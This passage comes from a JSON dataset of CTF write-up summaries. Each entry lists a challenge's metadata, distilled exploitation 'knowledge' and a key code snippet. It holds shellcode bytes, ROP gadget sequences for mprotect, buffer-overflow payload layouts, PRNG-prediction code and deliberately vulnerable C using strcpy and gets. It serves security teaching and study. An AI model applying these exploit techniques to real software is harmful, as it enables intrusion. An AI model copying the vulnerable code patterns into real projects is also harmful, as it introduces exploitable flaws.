        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nvoid vulnerable_function(char *input) {\n    char buffer[64];\n    strcpy(buffer, input); // Vulnerable to buffer overflow\n    printf(\"You entered: %s\\n\", buffer);\n}\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        printf(\"Usage: %s <input>\\n\", argv[0]);\n        return 1;\n    }\n    vulnerable_function(argv[1]);\n    return 0;\n}\n```"
    },
    {
        "name": "Re_ Plaid Party Planning",
        "write_up": "dataset/raw/Re_ Plaid Party Planning.md",
        "type": "pwn",
        "competition": [
            "PlaidCTF/2018",
            "https://ctftime.org/event/617/tasks/"
        ],
        "score": -1.0,
        "max_score": 800,
        "difficulty": -1,
        "knowledge": [
            "When tackling complex graph-based problems, particularly ones involving finding minimum paths that additionally require each node (person) to visit a specific set of nodes (cities with food) en route to a common destination, Dijkstra's algorithm is a potent tool for determining the shortest path between nodes in a weighted graph. The application extends to determining the shortest path for each person to the cities with required pickups before heading to the destination. This approach is useful under the condition that the graph represents a set of locations connected by paths with associated travel times or costs.",
            "The process of optimizing solutions involving permutations, especially when dealing with assignments of tasks (e.g., picking up food items) to agents (people traveling), can greatly benefit from a combination of greedy algorithms for initial approximation and brute-force algorithms with pruning for exact solutions. The greedy algorithm quickly provides a reasonably good solution by making locally optimal choices, such as swapping assignments to reduce total travel time. The brute-force approach systematically explores all possible assignments to ensure the optimal solution is found. Pruning enhances efficiency by eliminating paths that cannot lead to an improvement over the best solution found so far. This technique is particularly useful in scenarios where the objective is to minimize a certain metric (e.g., total travel time) while adhering to specific constraints (e.g., each person picks up exactly one food item).\n\nExample of pruning logic in pseudo-code:\n```\nbest_distance = greedy_algorithm_solution()\nfunction explore_branch(current_distance, level):\n    if current_distance >= best_distance:\n        return  # Pruning condition\n    if level == last_level:\n        best_distance = min(current_distance, best_distance)\n        return\n    for each food_assignment in possible_assignments[level]:\n        explore_branch(current_distance + distance_matrix[level][food_assignment], level + 1)\n```"
        ],
        "key": "```python\ndef dijkstra(graph, start):\n    import heapq\n    queue = [(0, start)]\n    distances = {node: float('infinity') for node in graph}\n    distances[start] = 0\n\n    while queue:\n        current_distance, current_node = heapq.heappop(queue)\n\n        if current_distance > distances[current_node]:\n            continue\n\n        for neighbor, weight in graph[current_node].items():\n            distance = current_distance + weight\n\n            if distance < distances[neighbor]:\n                distances[neighbor] = distance\n                heapq.heappush(queue, (distance, neighbor))\n\n    return distances\n\n# Example graph representation\ngraph = {\n    0: {1: 152, 4: 586, 7: 665},\n    1: {0: 152, 2: 998},\n    2: {1: 998, 9: 475, 5: 260},\n    3: {8: 966, 6: 871},\n    4: {0: 586},\n    5: {2: 260, 6: 83},\n    6: {3: 871, 5: 83, 11: 669},\n    7: {0: 665},\n    8: {3: 966, 9: 571},\n    9: {2: 475, 8: 571, 10: 545, 11: 659},\n    10: {9: 545, 11: 436},\n    11: {6: 669, 9: 659, 10: 436}\n}\n\n# Calculate shortest paths from a starting city\nstart_city = 0\ndistances = dijkstra(graph, start_city)\nprint(distances)\n```\n"
    },
    {
        "name": "Re_Montagy",
        "write_up": "dataset/raw/Re_Montagy.md",
        "type": "This CTF challenge is of the type crypto.",
        "competition": [
            "RealWorld/2021",
            "https://ctftime.org/event/1198/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In blockchain challenges involving smart contracts, exploring the possibility of utilizing equivalent keys for hash functions can enable the alteration of contract bytecodes without changing the hash value. This approach can be particularly effective when dealing with cryptographic functions like the TEA (Tiny Encryption Algorithm) that exhibit vulnerability to equivalent key attacks. Equivalent keys allow for the flipping or changing of certain opcode pairs in the contract's bytecode, provided these changes occur at specific byte intervals (such as changing bytes at positions that align with the key division in the encryption process).",
            "For challenges requiring manipulation of contract execution flow, Jump Oriented Programming (JOP) can be an invaluable technique. JOP involves controlling the execution flow of a contract by carefully manipulating the stack and the program counter through crafted inputs, enabling indirect control over the contract's behavior. This method relies on finding and using available opcodes within the contract that can facilitate arbitrary execution through strategic jumps, often illuminated by backdoor insertions or modifications made possible by exploiting weaknesses like equivalent keys in the contract's cryptographic functions."
        ],
        "key": "```solidity  \npragma solidity ^0.5.11;\n\ncontract Montagy{  \n   address payable public owner;  \n   mapping(bytes32=>uint256) registeredIDLength;  \n   mapping(address=>bytes32) puzzleID;  \n   ...  \n   modifier onlyPuzzle(){  \n       require(puzzleID[msg.sender] != 0);  \n       _;  \n   }\n\n   function registerCode(bytes memory a) public onlyOwner {  \n       registeredIDLength[tag(a)] = a.length;  \n   }\n\n   function newPuzzle(bytes memory code) public returns(address addr){  \n       bytes32 id = tag(code);  \n       require(registeredIDLength[id] == code.length);\n\n       addr = deploy(code);  \n       lastchildaddr = addr;  \n       puzzleID[addr] = id;  \n   }\n\n   function solve(string memory info) public onlyPuzzle {  \n       owner.transfer(address(this).balance);  \n       winnerinfo = info;  \n   }  \n   ...  \n   function tag(bytes memory a) pure public returns(bytes32 cs){  \n       assembly{  \n           let groupsize := 16  \n           let head := add(a,groupsize)  \n           let tail := add(head, mload(a))  \n           let t1 := 0x21711730  \n           let t2 := 0x7312f103  \n           let m1,m2,m3,m4,p1,p2,p3,s,tmp  \n           for { let i := head } lt(i, tail) { i := add(i, groupsize) } {  \n               s := 0x6644498b  \n               tmp := mload(i)  \n               m1 := and(tmp,0xffffffff)  \n               m2 := and(shr(0x20,tmp),0xffffffff)  \n               m3 := and(shr(0x40,tmp),0xffffffff)  \n               m4 := and(shr(0x60,tmp),0xffffffff)  \n               for { let j := 0 } lt(j, 0x10) { j := add(j, 1) } {  \n                   s := and(add(s, 0x68696e74),0xffffffff)  \n                   p1 := sub(mul(t1, 0x10), m1)  \n                   p2 := add(t1, s)  \n                   p3 := add(div(t1,0x20), m2)  \n                   t2 := and(add(t2, xor(p1,xor(p2,p3))), 0xffffffff)  \n                   p1 := add(mul(t2, 0x10), m3)  \n                   p2 := add(t2, s)  \n                   p3 := sub(div(t2,0x20), m4)  \n                   t1 := and(add(t1, xor(p1,xor(p2,p3))), 0xffffffff)  \n               }  \n           }  \n           cs := xor(mul(t1,0x100000000),t2)  \n       }  \n   }  \n}\n\n```\n\n```solidity  \npragma solidity ^0.5.11;\n\ncontract Puzzle{  \n   ...  \n   function loose() view public returns(bool){  \n       uint256 t1 = (a^b^c)+(d^e^f)+(g^h^i);  \n       uint256 t2 = (a+d+g)^(b+e+h)^(c+f+i);  \n       require(t1 + t2 < 0xaabbccdd);  \n       require(t1 > 0x8261e26b90505061031256e5afb60721cb);  \n       require(0xf35b6080614321368282376084810151606401816080016143855161051756 >= t1*t2);  \n       require(t1 - t2 >= 0x65e670d9bd540cea22fdab97e36840e2);  \n       return true;  \n   }  \n   function harsh(bytes memory seed, string memory info) public{  \n       require(loose());  \n       if (keccak256(seed) == bytes32(bytes18(0x6111d850336107ef16565b908018915a9056))) {  \n           server.solve(info);  \n       }  \n   }  \n}  \n```"
    },
    {
        "name": "Re_Sign",
        "write_up": "dataset/raw/Re_Sign.md",
        "type": "This challenge is a **crypto** type CTF challenge.",
        "competition": [
            "De1CTF/2019",
            "https://ctftime.org/event/843/tasks/"
        ],
        "score": 206,
        "max_score": 952,
        "difficulty": 0.21638655462184875,
        "knowledge": [
            "In a challenge involving analysis or reverse engineering of binary code to derive a Base64 encoded string, one may encounter arrays representing index values that map to characters in a standard Base64 character set (e.g., \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\"). To extract the Base64 encoded message, iterate through the index array, translating each index to its corresponding character in the Base64 character set. This method can be particularly useful in scenarios where the encoded message is obfuscated within the binary and is not directly visible.",
            "For challenges where a string is XOR-ed with its index or a similar simple algorithm to obfuscate data, iterating over the obfuscated array and applying the reverse of the applied obfuscation method (e.g., XOR-ing each character with its index again) will reveal the original string. This technique is widely applicable in scenarios involving basic XOR obfuscation, especially when the obfuscation pattern is consistent, like each character being XOR-ed with its index or a fixed key.\n\nExample payload to reverse XOR obfuscation:  \n```python\n# Assuming list_41E380 represents the obfuscated array and its elements are XOR-ed with their respective indices.\noriginal_list = [chr(list_41E380[i] ^ i) for i in range(len(list_41E380))]\nprint(''.join(original_list))\n```"
        ],
        "key": "```c\nint main()  \n{  \n\tint int32_41E3D0[] = { 8, 59, 1, 32, 7, 52, 9, 31, 24, 36, 19, 3, 16, 56, 9, 27, 8, 52, 19, 2, 8, 34, 18, 3, 5, 6, 18, 3, 15, 34, 18, 23, 8, 1, 41, 34, 6, 36, 50, 36, 15, 31, 43, 36, 3, 21, 65, 65 };  \n\tchar str_41E499[] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\";  \n\tchar base64_C[49] = {0};  \n\tfor (int i = 0; i < 48; i++)  \n\t{  \n\t\tint temp_index = int32_41E3D0[i];  \n\t\tbase64_C[i] = str_41E499[temp_index - 1];\n\n\t}  \n\tcout <<\"base64_C:\"<< base64_C << endl;\n\n\tchar psss_list[65] = { 0 };  \n\tchar list_41E380[] = { 48, 48, 48, 48, 48, 48, 48, 48, 48, 48, 91, 92, 73, 95, 90, 86, 69, 88, 93, 67, 85, 70, 82, 81, 95, 81, 80, 80, 80, 71, 70, 92, 118, 99, 108, 110, 85, 82, 67, 85, 92, 80, 95, 66, 67, 93, 79, 92, 84, 87, 85, 91, 94, 94, 90, 77, 64, 90, 76, 89, 82, 80, 21, 16 };  \n\tfor (int i = 0; i <64; i++)  \n\t{  \n\t\tpsss_list[i] = list_41E380[i] ^ i;  \n\t}  \n\tcout << \"psss_list:\" << psss_list << endl;  \n  \n\tchar str_re[100] = {0};  \n\tBase64_decode(base64_C, psss_list, str_re);  \n\tcout << \"flag:\" << str_re << endl;\n\n  \n\tgetchar();\n\n\treturn 0;  \n}  \n```"
    },
    {
        "name": "Rick Sanchez Algorithm",
        "write_up": "dataset/raw/Rick Sanchez Algorithm.md",
        "type": "crypto",
        "competition": [
            "SpaceHeroes/2023",
            "https://ctftime.org/event/1856/tasks/"
        ],
        "score": 158,
        "max_score": 1000,
        "difficulty": 0.158,
        "knowledge": [
            "When faced with RSA encryption challenges, if the public exponent `e` is noticeably large compared to the modulus `n`, Wiener's attack can be applied, especially if the decryption exponent `d` is small. Wiener's attack is viable in cases where conventional factorization methods might not reveal `n`'s factors directly. To implement this, one can use the `owiener` Python module. Example command to install `owiener`: `python3 -m pip install owiener`.",
            "To apply Wiener's attack in a Python script, after obtaining the RSA variables (ciphertext `C`, modulus `n`, and exponent `e`), utilize the `owiener.attack(e, n)` function to potentially find the secret decryption exponent `d`. If `d` is found, the plaintext `m` can be recovered by computing `m = pow(C, d, n)` and converting `m` to readable format, usually with `Crypto.Util.number.long_to_bytes(m).decode()`. If Wiener's attack does not succeed, it implies the attack's conditions aren't met (e.g., `d` is not sufficiently small in relation to `n`)."
        ],
        "key": "```python\nd = owiener.attack(e, n)                                   # The actual script\nitself is this small lol  \nif d:  \n   m = pow(C, d, n)  \n   flag = long_to_bytes(m).decode()  \n   print(flag)  \nelse:  \n   print(\"Wiener's Attack failed.\")  \n```"
    },
    {
        "name": "RickNMorty",
        "write_up": "dataset/raw/RickNMorty.md",
        "type": "pwn",
        "competition": [
            "csictf/2020",
            "https://ctftime.org/event/1081/tasks/"
        ],
        "score": -1,
        "max_score": 2000,
        "difficulty": -1,
        "knowledge": [
            "When faced with a challenge that involves mathematical computation, especially if it involves sequences or patterns generated by functions, the effective approach is to reverse engineer the code (if available) to understand how the sequence or pattern is generated. This involves analyzing each function in the code to replicate the mathematical operations accurately. Python scripts can be highly effective for replicating such functions and generating the required response or output.",
            "For challenges that require real-time interaction with a server, such as supplying computed answers within a specific time frame, use automation tools like pwntools in Python. This tool can automate the process of connecting to the server, reading input (such as pairs of numbers), processing the input through the replicated functions to compute responses, and then sending these responses back to the server. In scenarios requiring timely responses to keep a session active or to satisfy a condition within a certain timeframe, automation with error handling can ensure responses are calculated and submitted without human delay, which is crucial for passing timed challenges.\n\nExample Payload:\n```python\nfrom pwn import *\n\n# Use pwntools to establish a connection to the challenge server\np = remote('chall.csivit.com', 30827)\n\ndef fun1(param_1, param_2):\n    # Function logic replicated from the challenge\n    local_c = 0\n    local_10 = 1\n    while (local_10 <= param_1) or (local_10 <= param_2):\n        if (param_1 % local_10 == 0) and (param_2 % local_10 == 0):\n            local_c = local_10\n        local_10 += 1\n    return local_c\n\ndef fun2(param_1):\n    # Function logic replicated from the challenge\n    if param_1 == 0:\n        return 1\n    else:\n        return param_1 * fun2(param_1 - 1)\n\nwhile True:\n    line = p.recvline()\n    if not line or line.decode().startswith('fun() took'):\n        break\n    nums = line.decode().rstrip().split(' ')\n    ans = fun1(int(nums[0]), int(nums[1]))  # Process input with fun1\n    ans = fun2(ans + 3)  # Process result of fun1 with fun2\n    p.sendline(str(ans))  # Send the answer back\n\np.stream()  # Receive the remainder of the stream (flag or any other output)\n```"
        ],
        "key": "```c\nundefined8 main(void)  \n{  \n int iVar1;  \n time_t tVar2;  \n long lVar3;  \n long local_48;  \n time_t local_40;  \n time_t local_38;  \n time_t local_30;  \n long local_28;  \n long local_20;  \n char *local_18;  \n int local_10;  \n int local_c;  \n  \n setbuf(stdin,(char *)0x0);  \n setbuf(stdout,(char *)0x0);  \n setbuf(stderr,(char *)0x0);  \n tVar2 = time(&local_30);  \n srand((uint)tVar2);  \n time(&local_38);  \n local_c = 1;  \n local_10 = 0;  \n while( true ) {  \n   iVar1 = rand();  \n   if (iVar1 % 3 + 4 < local_10) break;  \n   iVar1 = rand();  \n   local_20 = (long)(iVar1 % 10 + 6);  \n   iVar1 = rand();  \n   local_28 = (long)(iVar1 % 10 + 6);  \n   printf(\"%d %d\\n\",local_20,local_28);  \n   __isoc99_scanf(&DAT_0040200f,&local_48);  \n   lVar3 = function1(local_20);  \n   lVar3 = function2(lVar3 + 3);  \n   if (lVar3 != local_48) {  \n     local_c = 0;  \n   }  \n   local_10 = local_10 + 1;  \n }  \n time(&local_40);  \n local_18 = (char *)(double)(local_40 - local_38);  \n printf(local_18,\"fun() took %f seconds to execute \\n\");  \n if ((local_c != 1) || (30.00000000 < (double)local_18)) {  \n   printf(\"Nahh.\");  \n }  \n else {  \n   puts(\"Hey, you got me!\");  \n   system(\"cat flag.txt\");  \n }  \n return 0;  \n}  \n```"
    },
    {
        "name": "RIPC4",
        "write_up": "dataset/raw/RIPC4.md",
        "type": "crypto",
        "competition": [
            "BSidesSF/2020",
            "https://ctftime.org/event/977/tasks/"
        ],
        "score": 484,
        "max_score": 493,
        "difficulty": 0.9817444219066938,
        "knowledge": [
            "In a challenge that involves shellcode injection where the allocated memory for the encryption state is executable (PROT_EXEC), creatively crafting a first-stage shellcode that reads in a more complex second-stage shellcode can be an effective way to bypass byte-specific constraints. The first-stage shellcode should perform minimal tasks like setting up a syscall to read further instructions into memory, thus avoiding the restrictions imposed by the initial encryption or encoding state.  \nExample first-stage shellcode:  \n```assembler  \n31 ff       xor    edi,edi  \nf7 e7       mul    edi  \n48 89 ce    mov    rsi,rcx // rcx contains the beginning of this RWX page  \nb6 04       mov    dh,0x4  \n0f 05       syscall // read(0, page, 0x400)  \n```",
            "When faced with the task of generating a specific output state with an encryption algorithm like RC4 for cryptographic challenges, crafting a script to precisely control the initial state or key to achieve a desired output state can be invaluable. This approach can be used to ensure that the encryption state starts with a payload that is executable as shellcode. The script would generally involve shuffling or manipulating the encryption algorithm's state to align with the target output.  \nExample concept (detailed implementation would depend on the challenge specifics):  \n```python  \nimport random\n\n# Initial RC4 state and target state setup\nstate = range(256)    \ntarget = range(256)  \n\n# Define the shellcode bytes you want at the beginning of the RC4 state\nshellcode = [0x31, 0xff, 0xf7, 0xe7, 0x48, 0x89, 0xce, 0xb6, 0x04, 0x0f, 0x05]  \ntarget = filter(lambda c: not c in shellcode, target)\n\nrandom.shuffle(target)  # Shuffle or manipulate to fit the target starting state\ntarget = shellcode + target  # Ensuring the desired shellcode is at the beginning\n\n# The following logic would aim to adjust the RC4 state to start with the shellcode\n# (Pseudo-implementation. Real logic depends on the intricacies of the RC4 adjustments needed)\nkey = ''  \njval = 0\n\nfor i in range(256):  \n   tnode = target[i]  \n   tgval = state.index(tnode)  \n   # Logic to adjust key based on the target state and initial state relations\n   # This is a simplified illustration; actual implementation may vary significantly\n\nprint(key)  # Output the key that aligns the RC4 state as desired\n```"
        ],
        "key": "```c\nunion {  \n void (*print_encoded)(const char *, size_t);  \n char *enc_state;  \n};\n\n#define PROT_MASK (PROT_READ|PROT_WRITE|PROT_EXEC)  \n#define PROT_RW (PROT_MASK|PROT_READ|PROT_WRITE)\n```"
    },
    {
        "name": "riscy-stack_ Userspace",
        "write_up": "dataset/raw/riscy-stack_ Userspace.md",
        "type": "pwn",
        "competition": [
            "CyberSecurityRumble/2023/Quals",
            "https://ctftime.org/event/1942/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When dealing with userspace binary exploitation challenges, especially on unfamiliar architectures such as RISC-V, the initial approach should include analyzing the binary's behavior, system call table, binary loading address, and permissions set on the memory pages. This foundational analysis is crucial for understanding the attack surface and planning an exploitation strategy. For RISC-V binaries loaded into a memory page with RWX (Read-Write-Execute) permissions, one can leverage this to inject and execute shellcode within the same page. This is particularly applicable in scenarios where the binary facilitates arbitrary read/write operations due to insufficient bounds checking.",
            "In challenges that involve manipulation of application-level data structures (like an array of notes or messages), executing an out-of-bounds write vulnerability can be crucial for achieving code execution or leaking information. Specifically, if an application fails to enforce lower bounds on array indices, an attacker can perform an out-of-bounds write by calculating an offset that leads to a controlled memory area. In scenarios where the binary or a critical data structure is loaded in memory close to user-controlled data, calculating the exact offset to overwrite specific binary sections (like the GOT, return addresses, function pointers) can enable arbitrary code execution. For instance, if a binary is loaded at `0x08000000` and a writable array is positioned at a predictable location such as `0x7ffeff38`, calculating the negative offset required to overwrite binary content from the array's base can be done as follows: Calculate the difference between the target address and the base of the binary, then adjust the value to match the array's indexing scheme (e.g., dividing by the element size, if necessary).\n\nExample of calculating the offset for an out-of-bounds access leading to arbitrary code execution:\n```python\nbinary_base = 0x08000000\narray_base = 0x7ffeff38\nelement_size = 4  # Assuming 4-byte elements (integers, pointers, etc.)\ntarget_address = 0x28c  # Example target offset within the binary for injecting shellcode\n\noffset = (binary_base - array_base) // element_size  # Calculate the offset needed\nprint(f\"Offset to reach the binary's target address: {offset}\")\n```"
        ],
        "key": "```c\n   ecall();  \n   lVar5 = read_number_from_user(s_index:_0800042b,7,2);  \n   if (lVar5 < lVar14) {  \n     ecall();  \n     uVar2 = *(uint *)(local_c8 + lVar5 * 4);  \n     // ... Convert uVar2 to string a print it; omitted for clarity  \n```\n\n```c\n   ecall();  \n   lVar5 = read_number_from_user(s_index:_0800042b,7,2);  \n   if (lVar5 < lVar14) {  \n     ecall();  \n     uVar4 = read_number_from_user(s_value:_08000397,7,2);  \n     *(undefined4 *)(local_c8 + lVar5 * 4) = uVar4;  \n     ecall();  \n   }  \n```"
    },
    {
        "name": "Rivest Shamir Adleman",
        "write_up": "dataset/raw/Rivest Shamir Adleman.md",
        "type": "crypto",
        "competition": [
            "csictf/2020",
            "https://ctftime.org/event/1081/tasks/"
        ],
        "score": -1,
        "max_score": 2000,
        "difficulty": -1,
        "knowledge": [
            "In scenarios where the RSA modulus (n) is not too large or when traditional methods fail, a brute-force approach can be used to factorize the modulus (n) to find primes (p) and (q) efficiently, especially when using optimized scripting languages or environments like pypy for faster execution. This method can be directly applied to obtain the prime factors required for further decryption steps in RSA challenges. Example script snippet for brute-forcing prime factors:\n```python\nfor i in range(2, 100000000):  \n if n % i == 0:  \n   p = i  \n   q = n//p  \n   print(\"p:\", p, \"q:\", q)  \n   break\n```",
            "After obtaining the prime factors (p and q) of the RSA modulus (n), the decryption key (d) can be computed using Euler's totient function (phi), which is calculated as (p-1)*(q-1), and then finding the modular multiplicative inverse of e modulo phi. This method is fundamental for decrypting the ciphertext in RSA challenges once the prime factors are known. Example snippet for calculating decryption key and decrypting message:\n```python\nphi = (p-1) * (q-1)\nd = pow(e, -1, phi)\nM = pow(c, d, n)  # Or for byte conversion: M = bytes.fromhex(hex(pow(c,d, n))[2:])\nprint(M)\n```"
        ],
        "key": "```python\nfor i in range(2, 100000000):  \n if n % i == 0:  \n   p = i  \n   q = n//p  \n   print(\"Factors found\")  \n   print(p, q)  \n   break  \n```"
    },
    {
        "name": "rntk",
        "write_up": "dataset/raw/rntk.md",
        "type": "pwn",
        "competition": [
            "AmateursCTF/2023",
            "https://ctftime.org/event/1983/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When a binary uses `srand` seeded with the current time (`time(NULL)`) for generating pseudo-random numbers, the sequence can be predicted if an attacker can synchronize their attack to run at the same time as the seeding occurs. This is because `srand()` initializes the pseudo-random number generator with a predictable seed value (current time), leading to a predictable sequence of numbers generated by `rand()`.\n    - To exploit, attackers can seed their own pseudo-random number generator with the same current time value to predict the numbers that the challenged binary will generate.\n    - Example exploitation code segment:\n    ```python\n    from ctypes import *\n    libc = cdll.LoadLibrary('/usr/lib/x86_64-linux-gnu/libc.so')\n    _time = libc.time(0x0)\n    libc.srand(_time)\n    guess = libc.rand()\n    ```",
            "In scenarios where input causes a stack buffer overflow, determining the correct offset to overwrite function return addresses or other control flow-determinant variables is essential for successful exploitation. This can often be achieved through the use of pattern generation and analysis tools (e.g., `cyclic` in pwntools), whereby a unique sequence of bytes is sent to the program, and the offset at which the program crashes indicates the exact position necessary to control the flow.\n    - For a binary susceptible to buffer overflow attacks, an attacker must craft a payload that carefully places the guessed or known value (such as a canary or return address) at the calculated offset. The payload often consists of a combination of controlled values and padding bytes.\n    - Example payload layout for buffer overflow exploitation:\n      ```python\n      payload = guessed_value + b\"A\"*offset + overwrite_value\n      ```\n      where `guessed_value` is what needs to be guessed correctly for the exploit (e.g., a pseudo-random number), `offset` is the number of padding bytes needed to reach the overflow target, and `overwrite_value` is the intended value to take control of the program flow (e.g., an address of the `win` function)."
        ],
        "key": "```c\nvoid random_guess(void) {  \n int rnd;  \n long strL;  \n char buffer [40];  \n int iStrL;  \n int localCanary;  \n  \n printf(\"Enter in a number as your guess: \");  \n localCanary = global_canary;  \n gets(buffer);  \n strL = strtol(buffer,(char **)0x0,10);  \n iStrL = (int)strL;  \n if (localCanary != global_canary) {  \n   puts(\"***** Stack Smashing Detected ***** : Canary Value Corrupt!\");  \n   exit(1);  \n }  \n rnd = rand();  \n if (iStrL == rnd) {  \n   puts(\"Congrats you guessed correctly!\");  \n }  \n else {  \n   puts(\"Better luck next time\");  \n }  \n return;  \n}\n```"
    },
    {
        "name": "Robert",
        "write_up": "dataset/raw/Robert.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 194,
        "max_score": 477,
        "difficulty": 0.40670859538784065,
        "knowledge": [
            "For challenges involving inverse mathematical functions where direct computation is difficult or impractical, considering the mathematical properties of the function can lead to alternative solutions. Specifically, when the challenge involves computing values such that \\(carmichael\\_lambda(n) = m\\), one can leverage the knowledge that \\(m\\) might be derived from a semi-prime (i.e., \\(m = \\lambda(pq)\\)) and use this property to find \\(n\\) by enumerating over divisors of \\(m\\). This method hinges on the assumption that \\(m\\) is related to the Carmichael function of a product of two primes.",
            "When tasked with inverse problems of cryptographic functions, leveraging auxiliary mathematical tools and scripting can automate the search for solutions. Utilizing tools such as SageMath for computations involving prime numbers, least common multiples (LCM), and divisors, combined with scripts for automated interaction with challenge servers (using libraries like `pwntools`), can successfully solve challenges that seem intractable by pure theoretical analysis. This approach is particularly useful when the solution involves brute-forcing through a set of possible solutions derived from the mathematical properties of the given problem.  \nExample sage script snippet for automated solution finding:\n```python\nfrom pwn import remote  \n# Set up connection to challenge server\nio = remote(\"example.ctf.com\", 12345)\n\n# Function to attempt finding n given m, leveraging specific mathematical properties\ndef reverse_lambda(n):  \n   for x in divisors(n):  \n       for y in divisors(n):  \n           if lcm(x, y) == n and is_prime(x + 1) and is_prime(y + 1):  \n               return (x + 1) * (y + 1)  \n```\nThis snippet shows setting up a remote connection to a CTF challenge server and implementing a function that attempts to reverse engineer the challenge's requirement by brute-forcing through divisors of a given number \\(m\\), checking for prime divisors that meet certain conditions, and returning a possible solution \\(n\\)."
        ],
        "key": "```python\ndef reverse_lambda(n):  \n   for x in divisors(n):  \n       for y in divisors(n):  \n           if lcm(x, y) == n and is_prime(x + 1) and is_prime(y + 1):  \n               return (x + 1) * (y + 1)  \n```"
    },
    {
        "name": "RoHaLd",
        "write_up": "dataset/raw/RoHaLd.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 180,
        "max_score": 477,
        "difficulty": 0.37735849056603776,
        "knowledge": [
            "Recovering curve parameters for an elliptic curve without direct disclosure of $(c,d,p)$ can be accomplished by algorithmically exploiting known points on the curve. This process involves calculating the Modulus $p$ by deriving and solving equations from these points, enabling the reconstruction of the curve and facilitating further cryptographic operations.\n    - Determine $p$ via $\\gcd$ of expressions derived from the differences and relations of known points on the curve.\n    - Solve for $c^2d$ with the obtained $p$, using the form $c^2 d = \\frac{x_1^2 - x_2^2 + y_1^2 - y_2^2 }{x_1^2 y_1^2 - x_2^2 y_2^2} \\pmod p$.\n    - Recover $c$ and $d$ from $c^2$ and $c^2d$ respectively. This knowledge then allows the re-creation of the curve for further analysis or cryptographic exploitation.",
            "Converting an Edwards curve to Weierstrass form enables the use of built-in Sage functions like discrete logarithm solving which might not be directly applicable or efficient on the original curve. This conversion can be practical when solving discrete log problems on different elliptic curve representations.\n    - Mapping involves changing the curve coordinates and parameters: first from Edwards to Montgomery using specific transformations and then from Montgomery to Weierstrass form. This process requires applying formulas for coordinate transformation and adjusting curve parameters according to the target curve's equation.\n    - Utilize the established mappings and perform coordinate transformations meticulously to ensure the integrity of the conversion, allowing the application of Sage's built-in functions effectively on the transformed curve."
        ],
        "key": "```python\ndef ison(C, P):  \n   c, d, p = C  \n   u, v = P  \n   return (u**2 + v**2 - c**2 * (1 + d * u**2*v**2)) % p == 0\n\ndef teal(C, P, Q):  \n   c, d, p = C  \n   u1, v1 = P  \n   u2, v2 = Q  \n   assert ison(C, P) and ison(C, Q)  \n   u3 = (u1 * v2 + v1 * u2) * inverse(c * (1 + d * u1 * u2 * v1 * v2), p) % p  \n   v3 = (v1 * v2 - u1 * u2) * inverse(c * (1 - d * u1 * u2 * v1 * v2), p) % p  \n   return (int(u3), int(v3))\n\ndef peam(C, P, m):  \n   assert ison(C, P)  \n   c, d, p = C  \n   B = bin(m)[2:]  \n   l = len(B)  \n   u, v = P  \n   PP = (-u, v)  \n   O = teal(C, P, PP)  \n   Q = O  \n   if m == 0:  \n       return O  \n   elif m == 1:  \n       return P  \n   else:  \n       for _ in range(l-1):  \n           P = teal(C, P, P)  \n       m = m - 2**(l-1)  \n       Q, P = P, (u, v)  \n       return teal(C, Q, peam(C, P, m))\n```"
    },
    {
        "name": "ropme",
        "write_up": "dataset/raw/ropme.md",
        "type": "The type of challenge described in the write-up is a `pwn` challenge.",
        "competition": [
            "BSidesSF/2021",
            "https://ctftime.org/event/1299/tasks/"
        ],
        "score": 579,
        "max_score": 967,
        "difficulty": 0.5987590486039297,
        "knowledge": [
            "When exploiting stack overflow vulnerabilities using Return Oriented Programming (ROP), if direct code injection is not possible due to memory protections such as non-executable stacks, use ROP gadgets to modify memory permissions to executable. This can be achieved by finding gadgets to adjust stack pointers and executing a syscall like `mprotect(2)` to change the stack's permissions, allowing for the execution of a secondary payload (shellcode). This approach necessitates finding gadgets for manipulating registers to hold the syscall number for `mprotect` (typically `eax = 125`), the stack's address as the first argument (`ebx`), the size of the stack to be page-aligned as the second argument (`ecx = 4096`), and the desired permission set as the third argument (`edx = PROT_READ|PROT_WRITE|PROT_EXEC`). The syscall is then triggered using an `int 0x80` gadget. Ensure the stack address is page-aligned before executing `mprotect`.\n   \n   Example gadget sequence for changing stack permissions:\n   ```asm\n   mov ebx, esp ; Grab stack address\n   dec ebx      ; Adjust for page alignment if necessary \n   pop eax      ; Load syscall number for mprotect (125)\n   pop ecx      ; Load page-aligned stack size (4096)\n   pop edx      ; Load desired permissions (PROT_READ|PROT_WRITE|PROT_EXEC)\n   int 0x80     ; System call to change permissions\n   ```",
            "If the target binary's execution environment or memory content is partially or wholly generated from a predictable pseudo-random source (e.g., seeded `rand()`), it is possible to replicate the target environment or memory state locally for analysis or exploitation preparation. This is particularly useful in scenarios where exploiting ROP or similar vulnerabilities requires prior knowledge of memory state, such as addresses of useful gadgets or values. This method requires obtaining or predicting the random seed, which is sometimes provided by the application itself or can be inferred from context (e.g., time of connection if `time()` is used for seeding). Replicating the memory state allows for the preemptive discovery of ROP gadgets or other exploit components in a controlled environment before attempting the actual exploit.\n\n    Example of replicating memory state:\n    ```C\n    srand(time(NULL)); // Seed with the predictable value shared by the target\n    for(int i = 0; i < CODE_LENGTH / 4; i++) {  \n       // Populate an array with values as the target would\n       simulated_random_code[i] = rand();  \n    }\n    ```\n    Utilizing the replicated state, an attacker can analyze the generated random code for exploitable gadgets or sequences to form a part of their exploit."
        ],
